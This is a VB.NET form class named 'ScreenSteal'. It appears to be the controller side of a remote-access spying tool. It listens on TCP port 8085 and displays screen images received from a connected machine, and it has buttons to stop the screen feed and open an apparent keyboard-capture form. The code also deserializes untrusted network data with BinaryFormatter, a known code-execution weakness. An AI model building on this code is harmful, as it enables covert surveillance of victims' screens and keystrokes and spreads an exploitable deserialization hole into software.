Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Threading
Imports System.Drawing
Imports System.Runtime.Serialization.Formatters.Binary

Public Class ScreenSteal
    Dim client As New TcpClient
    Dim server As New TcpListener(8085)
    Dim nstream As NetworkStream

    Dim listening As New Thread(AddressOf Listen)
    Dim getImage As New Thread(AddressOf receiveImage)

    Private Sub receiveImage()
        Dim bf As New BinaryFormatter
        While client.Connected = True
            nstream = client.GetStream
            picturebox1.Image = bf.Deserialize(nstream)
        End While
    End Sub

    Private Sub Listen()
        While client.Connected = False
            server.Start()
            client = server.AcceptTcpClient
        End While
        getImage.Start()
    End Sub


    Function Start()
        listening.Start()
    End Function

    Private Sub ScreenSteal_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub ToolStripButton1_Click(sender As Object, e As EventArgs) Handles ToolStripButton1.Click
        tools.stopscreen()
        listening.Abort()
        server.Stop()
        Me.Close()
    End Sub

    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click

    End Sub

    Private Sub ToolStripButton2_Click(sender As Object, e As EventArgs) Handles ToolStripButton2.Click
        Keyboard.Show()
    End Sub
End Class
